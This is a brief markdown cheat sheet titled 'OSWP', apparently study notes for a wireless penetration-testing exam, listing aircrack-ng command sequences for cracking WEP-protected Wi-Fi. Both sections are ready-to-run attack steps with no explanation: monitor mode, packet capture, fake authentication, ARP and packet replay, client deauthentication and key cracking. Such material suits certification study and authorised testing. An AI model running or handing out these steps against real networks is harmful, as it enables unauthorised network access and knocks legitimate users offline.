# OSWP


### WEP (ARP replay attack - With Client):
```
1)airmon-ng start wlan0 3
2)airodump-ng -w wep1 -c 3 --bssid <AP MAC>
3)aireplay-ng -1 0 -e NETGEAR -a <AP MAC> -h <MACCLIENT> mon0 (Fake authentication)
4)aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
5)aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
6)aircrack-ng -z <capture filename>
```

### WEP (Via Client ):
```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
    aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface>
    aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
    aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>
aircrack-ng -z <capture>
```
